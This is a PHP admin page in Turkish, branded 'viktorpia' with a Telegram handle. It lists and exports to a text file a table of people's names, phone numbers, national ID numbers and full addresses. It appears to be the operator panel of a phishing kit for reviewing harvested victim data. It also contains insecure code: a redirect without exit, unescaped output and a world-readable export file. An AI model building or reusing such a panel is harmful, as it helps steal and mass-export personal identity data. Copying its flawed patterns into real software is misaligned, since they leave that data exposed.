

<?php



session_start();
if(empty($_SESSION['username']))
{
  header("location:giris.php");
}



?>


<!DOCTYPE html>
<html lang="en">

<head>

<?php
include("inc/title.php");
?>

</head>

<body class="">
	<!-- [ Pre-loader ] start -->
	<div class="loader-bg">
		<div class="loader-track">
			<div class="loader-fill"></div>
		</div>
	</div>
	<!-- [ Pre-loader ] End -->
	<!-- [ Mobile header ] start -->
	<div class="pc-mob-header pc-header">
		<div class="pcm-logo">
			<img src="resim/logo.png" alt="" class="logo logo-lg">
		</div>
		<div class="pcm-toolbar">
			<a href="#!" class="pc-head-link" id="mobile-collapse">
				<div class="hamburger hamburger--arrowturn">
					<div class="hamburger-box">
						<div class="hamburger-inner"></div>
					</div>
				</div>
			</a>
			<a href="#!" class="pc-head-link" id="headerdrp-collapse">
			
			</a>
			<a href="#!" class="pc-head-link" id="header-collapse">
			
			</a>
		</div>
	</div>
<?php
include("inc/menu.php");
?>
	
	
<div class="pc-container">
    <div class="pcoded-content">
        <!-- [ breadcrumb ] start -->
        <div class="page-header">
            <div class="page-block">
                <div class="row align-items-center">
                    <div class="col-md-6">
                        <div class="page-header-title">
                            <h5 class="m-b-10"> V İ K T O R P İ A </h5>
                        </div>
                        <ul class="breadcrumb">
                            <li class="breadcrumb-item"><a href="">Telegram</a></li>
                            <li class="breadcrumb-item"> @viktorpia</li>
                        </ul>
                    </div>
                </div>
            </div>
        </div>
        <!-- [ breadcrumb ] end -->
        <!-- [ Main Content ] start -->

          


        <div class="row">
            <!-- support-section start -->
            <div class="col-md-6">
                <div class="card">
                <form method="post">
    <input type="submit" name="save_to_txt" value="Veriyi Txt Olarak Kaydet">
</form>

<?php

include('baglan.php');
if (isset($_POST['save_to_txt'])) {


       
        // Veriyi çek
        $sql = "SELECT * FROM ty_adres";
        $stmt = $conn->prepare($sql);
        $stmt->execute();
        $data = $stmt->fetchAll(PDO::FETCH_ASSOC);

        // Veriyi txt dosyasına kaydet
        $file = fopen('veri.txt', 'w');

        foreach ($data as $row) {
            // Her satırı txt dosyasına ekleyin
            fwrite($file, implode("\t", $row) . "\n");
        }

        fclose($file);

        echo "Veri başarıyla txt dosyasına kaydedildi.";
    } 

?>


                    <div class="card-header">
                        <h5> Adresler</h5>
                        <span class="d-block m-t-5">  <code>v i k t o r p i a</code>   </span>
                    </div>
                    <div class="card-body table-border-style">
                        <div class="table-responsive">
                            <table class="table">
                                <thead>
                                    <tr>
                                        <th>ID</th>
                                        <th> Ad Soyad</th>
                                        <th> Telefon</th>
                                        <th> TC Kimlik</th>
                                     
                                     <th> İl </th>
                                        <th> ilce</th>
                                        <th> Adres Başlığı </th>
                                     <th>Tam Adres</th>
                                    </tr>
                                </thead>
                                <tbody>
                                                                                       
  <?php 

$log = $conn->query("SELECT * FROM ty_adres ");
foreach ($log as $admin) {
 
 
    $id = $admin['id'];
    $adsoyad = $admin['adsoyad'];
    $telefonno = $admin['telefonno'];
    $adresbasligi = $admin['adresbasligi'];
    $tckimlik = $admin['tckimlik'];
  
    $il = $admin['il'];
    $ilce = $admin['ilce'];
    $tamadres = $admin['tamadres'];
 

 
 echo " <tr>   <td>$id</td> </td> <td>$adsoyad</td>  <td>$telefonno</td>  <td>$tckimlik</td>   <td>$il</td>  <td>$ilce</td>  <td>$adresbasligi</td>   <td>$tamadres</td>  
 
 
 </tr>  </tbody>";

}
 ?>

                            </table>
                        </div>
                    </div>
                </div>
            </div>
                        </div>
                       
               
                
                
                         
                        
                  
                  
                </div>
           
            </div>
          
       
      
        </div>
        <!-- [ Main Content ] end -->
    </div>
</div>
<!-- [ Main Content ] end -->
    <!-- Warning Section start -->
    <!-- Older IE warning message -->
    <!--[if lt IE 11]>
        <div class="ie-warning">
            <h1>Warning!!</h1>
            <p>You are using an outdated version of Internet Explorer, please upgrade
               <br/>to any of the following web browsers to access this website.
            </p>
            <div class="iew-container">
                <ul class="iew-download">
                    <li>
                        <a href="http://www.google.com/chrome/">
                            <img src="assets/images/browser/chrome.png" alt="Chrome">
                            <div>Chrome</div>
                        </a>
                    </li>
                    <li>
                        <a href="https://www.mozilla.org/en-US/firefox/new/">
                            <img src="assets/images/browser/firefox.png" alt="Firefox">
                            <div>Firefox</div>
                        </a>
                    </li>
                    <li>
                        <a href="http://www.opera.com">
                            <img src="assets/images/browser/opera.png" alt="Opera">
                            <div>Opera</div>
                        </a>
                    </li>
                    <li>
                        <a href="https://www.apple.com/safari/">
                            <img src="assets/images/browser/safari.png" alt="Safari">
                            <div>Safari</div>
                        </a>
                    </li>
                    <li>
                        <a href="http://windows.microsoft.com/en-us/internet-explorer/download-ie">
                            <img src="assets/images/browser/ie.png" alt="">
                            <div>IE (11 & above)</div>
                        </a>
                    </li>
                </ul>
            </div>
            <p>Sorry for the inconvenience!</p>
        </div>
    <![endif]-->
    <!-- Warning Section Ends -->
    <!-- Required Js -->
    <script src="assets/js/vendor-all.min.js"></script>
    <script src="assets/js/plugins/bootstrap.min.js"></script>
    <script src="assets/js/plugins/feather.min.js"></script>
    <script src="assets/js/pcoded.min.js"></script>
    <!-- <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js"></script> -->
    <!-- <script src="assets/js/plugins/clipboard.min.js"></script> -->
    <!-- <script src="assets/js/uikit.min.js"></script> -->

<!-- Apex Chart -->
<script src="assets/js/plugins/apexcharts.min.js"></script>


<!-- custom-chart js -->
<script src="assets/js/pages/dashboard-sale.js"></script>
</body>

</html>
